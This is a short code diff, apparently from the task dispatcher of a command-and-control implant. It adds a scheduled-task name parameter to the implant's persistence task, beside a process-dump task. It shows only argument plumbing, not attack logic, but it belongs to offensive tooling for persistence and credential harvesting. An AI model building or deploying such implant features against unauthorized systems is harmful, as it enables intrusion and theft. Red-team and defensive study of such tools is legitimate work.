@@ -315,7 +315,11 @@ namespace Handler
                 );
                 break;
             case TASK_PERSIST:
-                wTaskResult = Task::Persist(pState, Utils::Convert::UTF8Decode(args["technique"]));
+                wTaskResult = Task::Persist(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["technique"]),
+                    Utils::Convert::UTF8Decode(args["schtask_name"])
+                );
                 break;
             case TASK_PROCDUMP:
                 wTaskResult = Task::Procdump(pState, Utils::Convert::UTF8Decode(args["pid"]));
